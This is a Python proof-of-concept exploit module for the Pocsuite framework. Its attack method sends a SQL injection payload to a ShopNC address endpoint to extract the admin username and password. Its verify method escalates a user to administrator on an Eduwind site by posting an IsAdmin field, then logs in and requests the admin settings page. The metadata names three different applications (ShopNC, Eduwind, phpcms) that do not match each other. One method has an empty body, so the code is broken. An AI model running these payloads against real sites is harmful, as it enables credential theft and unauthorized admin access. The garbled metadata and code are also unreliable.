#!/usr/bin/env python
# coding: utf-8
import re
import urlparse
import getpass
from pocsuite.net import req
from pocsuite.poc import POCBase, Output
from pocsuite.utils import register
from pocsuite.lib.utils.require import require_header


class EduwindPOC(POCBase):
    vulID = '90650'  # ssvid
    version = '1'
    author = ['Dubuqingfeng']
    vulDate = '2016-01-13'
    createDate = '2016-02-03'
    updateDate = '2016-02-03'
    references = ['http://www.sebug.net/vuldb/ssvid-90650']
    name = '_90650_shopnc_2008_place_sql_inj_PoC'
    appPowerLink = 'http://www.phpcms.cn'
    appName = 'Eduwind'
    appVersion = '2008'
    vulType = 'SQL Injection'
    desc = '''
        phpcms 2008 中广告模块，存在参数过滤不严，
        导致了sql注入漏洞，如果对方服务器开启了错误显示，可直接利用，
        如果关闭了错误显示，可以采用基于时间和错误的盲注
    '''
    samples = ['http://10.1.200.28/']

    @require_header('cookie')
    def _attack(self):
        result = {}
        url = urlparse.urljoin(self.url, '/shop/index.php?act=member_address&op=address')
        vul_url = urlparse.urljoin(self.url, '/shop/index.php?act=member_address&op=address&inajax=1')
        payload = "exp&true_name[]=1,1,1,concat(0x7e,(SELECT admin_name FROM shopnc_admin limit 0,1)),concat(0x7e,(SELECT admin_password FROM shopnc_admin limit 0,1)),1,1,1) -- a"
        values = list()
        values.append("form_submit=ok&id=&true_name[]=")
        values.append(payload)
        values.append("&city_id=36&area_id=41&area_info=%E5%8C%97%E4%BA%AC%09%E5%8C%97%E4%BA%AC%E5%B8%82%09%E6%9C%9D%E9%98%B3%E5%8C%BA&address=wrwr&tel_phone=rwrwer&mob_phone=12312344123")
        post_data = "".join(values)

        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        req.post(vul_url, data=post_data, headers=headers)
        res = req.get(url)
        if res.status_code == 200:
            match_result = re.findall(r'~\w*', res.content, re.I | re.M)
            if match_result:
                result['AdminInfo'] = {}
                result['AdminInfo']['Username'] = match_result[0][1:]
                result['AdminInfo']['Password'] = match_result[1][1:]
        return self.parse_attack(result)

    @require_header('cookie')
    def _verify(self):
        result = {}
        #   定义地址
        vul_url = urlparse.urljoin(self.url, '/index.php?r=me/setBasic')
        logout_url = urlparse.urljoin(self.url, '/index.php?r=u/logout')
        login_url = urlparse.urljoin(self.url, '/index.php?r=u/login')
        admin_url = urlparse.urljoin(self.url, '/index.php?r=admin/setting/site')
        #   提升管理员权限Payload
        payload = "UserInfo%5Bname%5D=dubuqingfeng&UserInfo%5Bbio%5D=test&UserInfo%5Bintroduction%5D=&UserInfo%5BIsAdmin%5D=0&yt0="

        headers = {"Content-Type": "application/x-www-form-urlencoded"}

        email = raw_input("Email: ")
        password = getpass.getpass('password:')

        rest = req.post(vul_url, data=payload, headers=headers)
        #   退出登录
        res = req.get(logout_url)


        login_values = list()
        login_values.append("LoginForm%5Busername%5D=")
        login_values.append(email)
        login_values.append("&LoginForm%5Bpassword%5D=")
        login_values.append(password)
        login_values.append("&LoginForm%5BrememberMe%5D=0&LoginForm%5BrememberMe%5D=1&yt0=%E7%99%BB%E9%99%86")
        login_post_data = "".join(login_values)
        #   进行登录
        admin_result = req.post(login_url, data=login_post_data, headers=headers)

        print rest.content

        if admin_result.status_code == 200:
            #   判断是否为管理员
            find_result = admin_result.content.find('<a href="/index.php?r=admin">后台管理</a>')
            if find_result != -1:
                #   获取cookie
                cookies = admin_result.cookies
                #   发送post请求
                get_shell_result = req.post(admin_url, cookies=cookies, headers=headers)

                print cookies
                print get_shell_result.content
                print get_shell_result.cookies

                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Postdata'] = payload
        return self.parse_attack(result)

    def do_login(self):

    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(EduwindPOC)